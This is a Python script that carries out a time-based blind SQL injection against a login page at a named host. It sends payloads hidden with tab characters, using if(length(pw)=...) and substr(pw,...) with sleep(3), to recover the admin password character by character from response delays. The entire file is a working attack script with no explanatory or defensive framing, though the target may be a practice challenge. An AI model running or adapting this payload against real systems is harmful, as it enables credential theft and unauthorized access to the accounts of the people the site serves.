import requests
import urllib
import time

length=0
password=""

print("[*] start")
print("[*] find password's length")

for j in range(0,40):
	try:
		query = "1'%09||%09id='admin'%26%26if(length(pw)="+str(j)+",sleep(3),0)%09--%09"
		payload = {"id":"admin","pw":query}
		headers = {"Content-Type":"application/x-www-form-urlencoded"}
		r=requests.post("http://yeali.me/1/login.php",data=payload,headers=headers).elapsed.total_seconds()
		#elapsed.total_seconds() : measuring http response time 
	except:
		print("exception")
		continue

	if r > 3:
		length=j
		break

print("length: ",length)

print("[*] find password")

for j in range(1,length+1):
	for i in range(48,128):
		try:
			query = "1'%09||%09id='admin'%26%26if(substr(pw,"+str(j)+",1)='"+str(chr(i))+"',sleep(3),0)%09--%09"
			payload = {"id":"admin","pw":query}
			headers = {"Content-Type":"application/x-www-form-urlencoded"}
			r = requests.post("http://yeali.me/1/login.php",data=payload,headers=headers).elapsed.total_seconds()
		except:
			print("exception")
			continue

		if r > 3 :
			password+=chr(i)
			print("find: ",password)
			break
		
		time.sleep(0.1)
print("password: ",password)